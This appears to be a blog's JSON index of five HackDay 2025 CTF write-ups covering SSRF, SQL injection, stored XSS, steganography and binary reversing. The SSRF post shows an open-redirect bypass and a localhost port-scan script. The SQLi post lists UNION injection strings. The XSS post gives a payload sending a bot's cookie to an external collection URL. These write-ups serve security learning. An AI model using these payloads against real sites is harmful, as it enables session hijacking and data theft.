[
  
  {
    "title": "HackDay 2025 - Super Website Verificator 3000",
    "url": "/posts/hackday-website-verificator/",
    "categories": "CTFs, HackDay 2025, Web",
    "tags": "web, ssrf",
    "date": "2025-01-26 00:00:00 +0100",
    





    
    "snippet": "Description  Category: Web  Vulnerability: SSRF  Our team of brilliant engineers has developed a highly sophisticated website designed to perform check-ups on other sites. It can even uncover hidde...",
    "content": "Description  Category: Web  Vulnerability: SSRF  Our team of brilliant engineers has developed a highly sophisticated website designed to perform check-ups on other sites. It can even uncover hidden information, possibly concealed by some clever tricksters. Take a look and see if you can find anything!Link of the eventEnumerationUpon inspecting the web application, we notice it allows users to make requests to other sites and display their content. This feature indicates a potential Server-Side Request Forgery (SSRF) vulnerability. In an SSRF attack, an attacker can manipulate the server to make requests to internal resources or services that are otherwise not accessible.ExploitationTrying to Access LocalhostIn most SSRF scenarios, attackers attempt to access localhost or internal network services to extract sensitive information, like private APIs, databases, or internal files. In this case, we send a request to the server using localhost to try and gather sensitive data :However, the application doesn’t allow direct access to localhost this way. When we attempt to access http://localhost, we get an error message.Exploiting Open RedirectWe can try using an Open Redirect. We send a link which, when viewed, redirects the victim to the chosen domain. For example this link:https://302.r3dir.me/--to/?url=http://localhost  This link will appear valid, as it uses the https://302.r3dir.me/ domain, which is accepted by the application.  However, when the victim accesses this link, they will be redirected to localhost, bypassing the server’s restrictions.Port ScanningWith Open Redirect in place, we can now use SSRF to perform a port scan on the internal network (in this case, on localhost). The goal is to find open ports that might be running services that could leak sensitive data.import requestsimport urllib3# Désactive les avertissements SSL pour éviter le spam dans les logsurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# Configuration du proxy Burp Suite proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}URL = \"http://challenges.hackday.fr:43244/api/check\"# Fonction principale pour scanner les portsdef main():    print(\"[+] Scan de ports en cours...\")        for port in range(1, 65536):  # Plage des ports à scanner        payload = f'https://302.r3dir.me/--to/?url=http://localhost:{port}/'        data = {            \"url\": payload,             \"showBody\": \"on\"        }        r = requests.post(URL, data=data, verify=False, proxies=proxies)        res_json = r.json()        if res_json[\"online\"] != False:            print(\"[+] Port ouvert: \", port)            print(\"Payload: \", payload)        print(\"[+] Scan fini.\")# Script principalif __name__ == \"__main__\":    main()The port scan results show that port 600 is open. Using the payload targeting this port, we access the service running on localhost:600.Payload:https://302.r3dir.me/--to/?url=http://localhost:600/This leads us to the flag.Flag : HACKDAY{Give_ME_YOuR_L0OPb@CK}"
  },
  
  {
    "title": "HackDay 2025 - The analytical engine leak",
    "url": "/posts/hackday-the-analytical-engine-leak/",
    "categories": "CTFs, HackDay 2025, Web",
    "tags": "web, sqli",
    "date": "2025-01-26 00:00:00 +0100",
    





    
    "snippet": "Description  Category: Web  Vulnerability: SQLi  In the shadow of the huge copper chimneys, a dark plot is brewing. The engineers of the Inventors’ Guild have developed a revolutionary device: a st...",
    "content": "Description  Category: Web  Vulnerability: SQLi  In the shadow of the huge copper chimneys, a dark plot is brewing. The engineers of the Inventors’ Guild have developed a revolutionary device: a steam-powered analytical machine capable of deciphering all secret codes. But before it could be activated, a group of cyber-saboteurs, the Black Mist, infiltrated its network to steal the plans. Fortunately, the plans were encrypted.  An allied spy intercepted a trail leading to the Steam Station’s digital archives, where a secret database stores crucial information for deciphering the device’s plans. However, access is restricted, and only a few people can extract the contents.  Your mission: exploit a flaw in the system to recover the encryption key before it falls into the wrong hands. To avoid alerting an archivist, the use of automatic tools is prohibited. Manual exploitation only.  no sqlmap or things like that allowedLink of the eventEnumerationIdentify the vulnerabilityUpon encountering a login field, a common first step is to test for SQL Injection (SQLi) vulnerabilities. This can be done by injecting characters commonly used in SQL queries, such as ' or \". In this case, injecting these characters resulted in an error message, confirming the presence of an SQLi vulnerability:This error indicates that the application integrates user input directly into SQL queries without proper sanitization, leaving it vulnerable to injection attacks. The clear error messages provide useful feedback, making it easier to exploit the vulnerability.By injecting a basic SQL payload, such as ' OR 1=1#, we were able to retrieve a response that included all user accounts :The task description mentions that there could be a hidden secret, and our goal is to recover the encryption key. To achieve this, we can attempt to use UNION SQL Injection to enumerate all existing tables and extract data from the database.We can infer the backend query structure as follows:SELECT username,password FROM usersOur goal is to manipulate this query to extract additional information from the database.ExploitationTo successfully exploit UNION SQLi, we need to satisfy two conditions:  The number of columns and their order must match between the original query and the injected query.  The data types of the columns in both queries must be compatible.1. Determining the Number of Columnswhatever' UNION SELECT NULL#           (&lt;= ERREUR)whatever' UNION SELECT NULL,NULL#      (&lt;= ERREUR)whatever' UNION SELECT NULL,NULL,NULL# (&lt;= OK !)  Result: 3 columns2. Determining Column Data Typeswhatever' UNION SELECT 'a',NULL,NULL#whatever' UNION SELECT NULL,'a',NULL#whatever' UNION SELECT NULL,NULL,'a'#  Result :          All 3 columns accept strings.      The third column does not return data to the user, likely being used internally (e.g., for an ID).      3. Enumerating the Database  Listing Tables    whatever' UNION SELECT table_name,NULL,NULL FROM information_schema.tables#      Result: We discover a table named blueprints:  Listing Columns of the blueprints Table    whatever' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='blueprints'#      Result: The table contains 5 columns: id, username, password description and file_name.  Extracting Data from the blueprints Table    whatever' UNION SELECT description,file_name,NULL FROM blueprints#      Result: We find an interesting file name, secret_key.txt, which appears to be encoded in Base58. Decoding it reveals the final flag:HACKDAY{$ea5y_INjeCTion$}"
  },
  
  {
    "title": "HackDay 2025 - Internal Blog",
    "url": "/posts/hackday-internal-blog/",
    "categories": "CTFs, HackDay 2025, Web",
    "tags": "web, xss",
    "date": "2025-01-26 00:00:00 +0100",
    





    
    "snippet": "Description  Category: Web  Vulnerability: XSS  You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading ...",
    "content": "Description  Category: Web  Vulnerability: XSS  You’ve received an anonymous tip from the Airship Mail Delivery Company claiming that a seemingly legitimate website is actually a front for trading stolen submarine mechanical parts. Yeah, that’s oddly specific…The localhost port is 3000. Take a closer look and see if you can uncover anything suspicious. The flag to find is the bot’s cookie.Link of the eventEnumerationAdmin visits posts and profil pageWe can also see an interesting piece of code that is shared with us:Code Leakawait newProfile.save()const isXSSDetected = sanitizeJson(profileData, res);The user is saved before XSS sanitization =&gt; Even if an XSS is detected by the server, the user will still be created.ExploitationDetecting the VulnerabilityWe create an account to test XSS on the user’s profile page:&lt;script&gt;alert(document.cookie)&lt;/script&gt;=&gt; We get the message “XSS Detected.” But if we navigate to our profile page using the token, the profile is still created, and an alert pops up =&gt; Vulnerable to XSS! ✅We can also notice that the Name field is the one vulnerable to XSS:ExploitationThe blog page mentions that we need to publish an article for an admin to review our profile (where our XSS is injected!!!). So, we will create an account that sends the admin’s cookie to our attacker server (using RequestBin).We create a profile with the following JavaScript script in the name field:&lt;img src=x onerror=this.src='https://eozgdsdwr0yqpzt.m.pipedream.net?cookie='+document.cookie&gt;Next, we publish an article so the admin visits our profile page. By checking the requests received on our attacker server, we can see the admin’s cookie, which contains the flag! ✅Flag : HACKDAY{0rd3R_M4tteRs_In_Ur_C0d3!!!!}  There was a Content Security Policy (CSP) directive in place:      connect-src 'self' http://127.0.0.1;    This blocks requests such as fetch() to other sites. However, this directive does not cover requests from &lt;img&gt; tags. To block requests made by img tags to other sites, an img-src directive or a default-src directive is required."
  },
  
  {
    "title": "HackDay 2025 -I Believe You Can't Fly",
    "url": "/posts/hackday-believe-you-cant-fly/",
    "categories": "CTFs, HackDay 2025",
    "tags": "forensic",
    "date": "2025-01-26 00:00:00 +0100",
    





    
    "snippet": "DescriptionCategory: Forensic  In the world of Featherstone Airways, where airships dominate the skies and steam-powered engines hum in harmony with the winds, disaster strikes aboard Flight 404. A...",
    "content": "DescriptionCategory: Forensic  In the world of Featherstone Airways, where airships dominate the skies and steam-powered engines hum in harmony with the winds, disaster strikes aboard Flight 404. A cacophony of alarms blares through the cabin, and an automated voice pierces the tension:  “Alert: Navigation systems compromised. Manual override unavailable.”  The captain, drenched in sweat, confesses that the ship’s intricate steam-core systems have been infiltrated by rogue machinists. The autopilot is spewing erratic commands, and the controls have been rendered useless. Amid the chaos, your gaze falls upon a forgotten device—a mechanical tablet left behind by the ship’s chief engineer. Its dimly glowing screen is your only hope to uncover the secrets of this sabotage and reclaim control of the vessel.  The tablet appears to hold critical files containing traces of the hackers’ interference. To restore the autopilot and prevent the airship from plunging into the abyss, you must uncover the password hidden within these files. As the last passenger with a keen mind for cyber-steam security, it falls to you to analyze these files, piece together the password, and save the airship before it’s too late. Time is of the essence, and the lives of everyone aboard rest in your hands. Will you rise to the challenge and prove yourself the hero of the skies?3 Files :  plane_logs.txt  say_hi.jpg  whoami.jpgLink of the eventSolve the challengeIn the file plane_logs.txt:  Encoded Messages:          ercbafr (ROT13) → “reponse”      c29sdXRpb24= (Base64) → “solution”      636c6566 (Hexadecimal) → “clef”      0110001011111011011000110110100001100101 (Binary) → “bûche”      KDFNGD~dPbCbiU6H (yet to decode).        Key Clues in the File:          Clue 1: “Sometimes the answer is just three steps ahead.” ✅  Solution: A Caesar Cipher with a shift of 3.      Clue 2: “The most secure password is often the simplest one.” ✅  Solution: The password for the file say_hi.jpg is “securepassword”.      Step 1: Decoding the Encrypted StringThe encoded message KDFNGD~dPbCbiU6H can be decrypted using a Caesar Cipher with a shift of 3.Applying the Caesar Decipher using the ASCII table reveals :KDFNGD~dPbCbiU6H → HACKDAY{aM_@_fR3EStep 2: Extracting the Hidden Data from say_hi.jpgUsing StegSeek, we analyze the say_hi.jpg file:stegseek say_hi.jpg  StegSeek 0.6 - https://github.com/RickdeJager/StegSeek  [i] Found passphrase: \"securepassword\"  [i] Original filename: \"shh.txt\".  [i] Extracting to \"say_hi.jpg.out\".  The extraction reveals the final part of the flag:-@LbaRT0s5}  Final FlagCombining both parts, we get the full flag:HACKDAY{aM_@_fR3E-@LbaRT0s5}"
  },
  
  {
    "title": "HackDay 2025 - Just dig",
    "url": "/posts/hackday-Just-dig/",
    "categories": "CTFs, HackDay 2025, Reverse",
    "tags": "reverse",
    "date": "2025-01-26 00:00:00 +0100",
    





    
    "snippet": "DescriptionCategory: Reverse Engineering  Researchers have recently uncovered a mysterious ancient artifact beneath the Cogswell Halls. Its purpose remains unknown, but its potential seems invaluab...",
    "content": "DescriptionCategory: Reverse Engineering  Researchers have recently uncovered a mysterious ancient artifact beneath the Cogswell Halls. Its purpose remains unknown, but its potential seems invaluable. Who knows? The secrets it holds could revolutionize modern knowledge. They need an expert eye—yours! Let’s dig in !File : Just_dig.outLink of the eventSolve the challengeExamining the BinaryWe begin by analyzing the provided binary file using the file command:file Just_dig.outJust_dig.out: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=6d1be85b880b780e60c14a840ba27bcc0ea90214, for GNU/Linux 3.2.0, not strippedThis tells us that the binary is a 32-bit ELF file, compiled for Linux systems. The binary is PIE (Position Independent Executable), meaning the memory addresses may vary at runtime, but since the binary is not stripped, we can still use tools like GDB to debug and analyze it effectively.Debugging with GDBUsing GDB, we identify a function called HackDay, which contains a series of comparisons. These comparisons iterate from 1 to 0xC (12), each time setting a specific value into a register before performing a comparison.0x565562a1 &lt;+0&gt;:\tmov    ebx,0x56556195   # Load string address into EBX0x565562a6 &lt;+5&gt;:\tinc    DWORD PTR ds:0x56559008      # 10x565562ac &lt;+11&gt;:\tcmp    DWORD PTR ds:0x56559008,0x1  # CMP 1,10x565562b3 &lt;+18&gt;:\tje     0x56556231 &lt;qRHxrv9HwO&gt;Each step involves examining a memory address and extracting its content. For example, at 0x56556195, we find the following:x/4x 0x56556195 =&gt; 0x53\t0x45 0x46 0x44 x/s 0x56556195=&gt; \"SEFDdkVf\\023\\371\\333\\310\\001bI\\306blRvXzRzr1\\224\\abX0=RGlHWXtp(\\003H\\f\"  The extracted value here is SEFD.Extracting and DecodingBy analyzing each step of the HackDay function, we repeat this process for all 12 iterations. We extract hexadecimal values, convert them to ASCII characters, and then concatenate them.1: 53h, 45h, 46h 44h =&gt; SEFD =&gt; HAC2: 53h, 30h, 52h 42h =&gt; S0RB =&gt; DA3: 57h, 58h, 74h 70h =&gt; WXtp =&gt; Y{i4: 58h, 30h, 78h 76h =&gt; X0xv =&gt; _Lo5: 64h, 6Bh, 56h 66h =&gt; dkVf =&gt; vE_6: 52h, 47h, 6Ch 48h =&gt; RGlH =&gt; DiG7: 5Ah, 79h, 46h     =&gt; ZyF  =&gt; g!8: 4Fh, 56h, 38h 78h =&gt; OV8x =&gt; 9_19: 62h, 6Ch, 52h 76h =&gt; blRv =&gt; nTo10: 58h, 7Ah, 52h 7Ah =&gt; XzRz =&gt; _4s11: 62h, 58h, 30h 3Dh =&gt; bX0= =&gt; m}12: 0h, 0h, 0h, 0h At this point, we notice that the resulting string resembles Base64-encoded text, ending with the = character, which is common for Base64 padding. We decode each extracted part from Base64 to reveal the final flag.Flag : HACKDAY{i_LovE_DiGg!9_1nTo_4sm}"
  }
  
]

